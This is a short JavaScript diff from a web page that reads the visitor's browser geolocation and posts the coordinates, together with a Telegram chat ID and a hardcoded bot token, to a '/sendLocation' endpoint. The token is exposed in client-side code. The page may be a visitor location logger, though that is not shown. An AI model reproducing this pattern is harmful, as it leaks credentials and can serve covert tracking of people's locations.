@@ -26,13 +26,12 @@
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
 
-                        // Replace with your server-side URL
-                        const url = 'https://yourserver.com/sendLocation'; 
+                        const url = '/sendLocation'; // Server-side endpoint
                         const data = {
-                            chatId: '5112680061',
+                            chatId: '5112680061', // Your Telegram chat ID
                             latitude: latitude,
                             longitude: longitude,
-                            botToken: '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'
+                            botToken: '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es' // Your Telegram bot token
                         };
 
                         fetch(url, {
